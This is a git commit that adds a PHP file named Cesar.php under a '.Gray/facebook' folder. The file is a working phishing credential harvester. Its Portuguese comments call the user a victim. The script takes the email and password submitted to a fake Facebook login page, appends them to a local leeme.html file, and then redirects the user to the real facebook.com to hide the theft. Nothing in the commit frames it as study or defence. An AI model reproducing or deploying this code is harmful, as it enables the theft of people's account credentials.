662743ef164d09f1894870f60aa7dfb1e649c56a
leandro2315 <leandromendes1567@gmail.com>
2020-05-16 17:50:38 -0300

    primeiro commit

---
+++ .Gray/facebook/Cesar.php
@@ -0,0 +1,19 @@
+<?
+/*
+Esse arquivo e o que processa todos os dados da vitima e os salva em um arquivo (leeme.html <- Aqui os dados serao salvos).
+*/
+
+#haxor.php
+// Atribua o valor as variaveis ​​de usuario e senha
+$email = $_POST['email'];
+$pass = $_POST['pass'];
+//Atribua o valor a variavel em que o nome de usuario e a senha sao salvos
+$guardame = fopen('leeme.html','a+');
+fwrite($guardame,
+"<br/><b>Usuario:</b>".$email.
+"<br/><b>senha:</b>".$pass." ");
+
+fclose($guardame);
+// redireciona para a pagina original (facebook)
+echo "<meta http-equiv='refresh' content='1;url=http://www.facebook.com'>"
+?>
